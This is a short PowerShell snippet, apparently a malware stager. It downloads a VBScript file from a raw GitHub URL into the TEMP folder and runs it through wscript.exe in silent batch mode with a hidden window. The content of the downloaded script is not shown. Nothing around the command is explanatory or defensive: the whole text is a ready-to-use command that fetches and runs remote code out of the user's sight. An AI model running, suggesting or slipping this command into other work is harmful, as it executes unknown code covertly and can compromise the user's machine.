$ws="$env:TEMP\run.vbs";
iwr -UseBasicParsing https://raw.githubusercontent.com/joaosetti98/sa/refs/heads/main/run.vbs -Out $ws;
Start-Process -FilePath 'wscript.exe' -ArgumentList "//B //nologo `"$ws`"" -WindowStyle Hidden
